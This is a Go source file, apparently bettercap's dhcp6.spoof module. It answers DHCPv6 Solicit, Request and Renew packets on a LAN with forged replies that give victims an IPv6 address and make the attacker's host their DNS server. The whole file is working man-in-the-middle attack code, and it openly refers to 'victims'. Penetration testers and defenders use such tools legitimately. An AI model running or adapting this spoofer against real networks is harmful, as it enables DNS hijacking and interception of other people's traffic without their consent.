package dhcp6_spoof

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	// TODO: refactor to use gopacket when gopacket folks
	// will fix this > https://github.com/google/gopacket/issues/334
	"github.com/mdlayher/dhcp6"
	"github.com/mdlayher/dhcp6/dhcp6opts"

	"github.com/evilsocket/islazy/tui"
)

type DHCP6Spoofer struct {
	session.SessionModule
	Handle        *pcap.Handle
	DUID          *dhcp6opts.DUIDLLT
	DUIDRaw       []byte
	Domains       []string
	RawDomains    []byte
	waitGroup     *sync.WaitGroup
	pktSourceChan chan gopacket.Packet
}

func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
	mod := &DHCP6Spoofer{
		SessionModule: session.NewSessionModule("dhcp6.spoof", s),
		Handle:        nil,
		waitGroup:     &sync.WaitGroup{},
	}

	mod.SessionModule.Requires("net.recon")

	mod.AddParam(session.NewStringParameter("dhcp6.spoof.domains",
		"microsoft.com, google.com, facebook.com, apple.com, twitter.com",
		``,
		"Comma separated values of domain names to spoof."))

	mod.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
		"Start the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("dhcp6.spoof off", "",
		"Stop the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod DHCP6Spoofer) Name() string {
	return "dhcp6.spoof"
}

func (mod DHCP6Spoofer) Description() string {
	return "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)."
}

func (mod DHCP6Spoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *DHCP6Spoofer) Configure() error {
	var err error

	if mod.Running() {
		return session.ErrAlreadyStarted(mod.Name())
	}

	if mod.Handle, err = network.Capture(mod.Session.Interface.Name()); err != nil {
		return err
	}

	err = mod.Handle.SetBPFFilter("ip6 and udp")
	if err != nil {
		return err
	}

	if err, mod.Domains = mod.ListParam("dhcp6.spoof.domains"); err != nil {
		return err
	}

	mod.RawDomains = packets.DHCP6EncodeList(mod.Domains)

	if mod.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), mod.Session.Interface.HW); err != nil {
		return err
	} else if mod.DUIDRaw, err = mod.DUID.MarshalBinary(); err != nil {
		return err
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("Enabling forwarding.")
		mod.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (mod *DHCP6Spoofer) dhcp6For(what dhcp6.MessageType, to dhcp6.Packet) (err error, p dhcp6.Packet) {
	err, p = packets.DHCP6For(what, to, mod.DUIDRaw)
	if err != nil {
		return
	}

	p.Options.AddRaw(packets.DHCP6OptDNSServers, mod.Session.Interface.IPv6)
	p.Options.AddRaw(packets.DHCP6OptDNSDomains, mod.RawDomains)

	return nil, p
}

func (mod *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)

	fqdn := target.String()
	if raw, found := solicit.Options[packets.DHCP6OptClientFQDN]; found && len(raw) >= 1 {
		fqdn = string(raw[0])
	}

	mod.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", tui.Bold(fqdn), target, len(mod.Domains))

	err, adv := mod.dhcp6For(dhcp6.MessageTypeAdvertise, solicit)
	if err != nil {
		mod.Error("%s", err)
		return
	}

	var solIANA dhcp6opts.IANA

	if raw, found := solicit.Options[dhcp6.OptionIANA]; !found || len(raw) < 1 {
		mod.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := solIANA.UnmarshalBinary(raw[0]); err != nil {
		mod.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	var ip net.IP
	if h, found := mod.Session.Lan.Get(target.String()); found {
		ip = h.IP
	} else {
		mod.Warning("Address %s not known, using random identity association address.", target.String())
		rand.Read(ip)
	}

	addr := fmt.Sprintf("%s%s", packets.IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))

	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
	if err != nil {
		mod.Error("Error creating IAAddr: %s", err)
		return
	}

	iaaddrRaw, err := iaaddr.MarshalBinary()
	if err != nil {
		mod.Error("Error serializing IAAddr: %s", err)
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{iaaddrRaw}}
	iana := dhcp6opts.NewIANA(solIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		mod.Error("Error serializing IANA: %s", err)
		return
	}

	adv.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := adv.MarshalBinary()
	if err != nil {
		mod.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	eth := layers.Ethernet{
		SrcMAC:       mod.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      mod.Session.Interface.IPv6,
		DstIP:      pip6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	dhcp := packets.DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
	if err != nil {
		mod.Error("Error serializing packet: %s.", err)
		return
	}

	mod.Debug("Sending %d bytes of packet ...", len(raw))
	if err := mod.Session.Queue.Send(raw); err != nil {
		mod.Error("Error sending packet: %s", err)
	}
}

func (mod *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
	mod.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", tui.Bold(target.String()), toType)

	err, reply := mod.dhcp6For(dhcp6.MessageTypeReply, req)
	if err != nil {
		mod.Error("%s", err)
		return
	}

	var reqIANA dhcp6opts.IANA
	if raw, found := req.Options[dhcp6.OptionIANA]; !found || len(raw) < 1 {
		mod.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
		mod.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	var reqIAddr []byte
	if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found {
		reqIAddr = raw[0]
	} else {
		mod.Error("Unexpected DHCPv6 packet, could not deserialize request IANA IAAddr.")
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{reqIAddr}}
	iana := dhcp6opts.NewIANA(reqIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		mod.Error("Error serializing IANA: %s", err)
		return
	}
	reply.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := reply.MarshalBinary()
	if err != nil {
		mod.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
	eth := layers.Ethernet{
		SrcMAC:       mod.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      mod.Session.Interface.IPv6,
		DstIP:      pip6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	dhcp := packets.DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
	if err != nil {
		mod.Error("Error serializing packet: %s.", err)
		return
	}

	mod.Debug("Sending %d bytes of packet ...", len(raw))
	if err := mod.Session.Queue.Send(raw); err != nil {
		mod.Error("Error sending packet: %s", err)
	}

	if toType == "request" {
		var addr net.IP
		if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found {
			addr = net.IP(raw[0])
		}

		if h, found := mod.Session.Lan.Get(target.String()); found {
			mod.Info("IPv6 address %s is now assigned to %s", addr.String(), h)
		} else {
			mod.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
		}
	} else {
		mod.Debug("DHCPv6 renew sent to %s", target)
	}
}

func (mod *DHCP6Spoofer) duidMatches(dhcp dhcp6.Packet) bool {
	if raw, found := dhcp.Options[dhcp6.OptionServerID]; found && len(raw) >= 1 {
		if bytes.Equal(raw[0], mod.DUIDRaw) {
			return true
		}
	}
	return false
}

func (mod *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
	var dhcp dhcp6.Packet
	var err error

	udp := pkt.Layer(layers.LayerTypeUDP).(*layers.UDP)
	if udp == nil {
		return
	}

	// we just got a dhcp6 packet?
	if err = dhcp.UnmarshalBinary(udp.Payload); err == nil {
		eth := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
		switch dhcp.MessageType {
		case dhcp6.MessageTypeSolicit:

			mod.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)

		case dhcp6.MessageTypeRequest:
			if mod.duidMatches(dhcp) {
				mod.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
			}

		case dhcp6.MessageTypeRenew:
			if mod.duidMatches(dhcp) {
				mod.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
			}
		}
	}
}

func (mod *DHCP6Spoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {
		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		src := gopacket.NewPacketSource(mod.Handle, mod.Handle.LinkType())
		mod.pktSourceChan = src.Packets()
		for packet := range mod.pktSourceChan {
			if !mod.Running() {
				break
			}

			mod.onPacket(packet)
		}
	})
}

func (mod *DHCP6Spoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.pktSourceChan <- nil
		mod.Handle.Close()
		mod.waitGroup.Wait()
	})
}
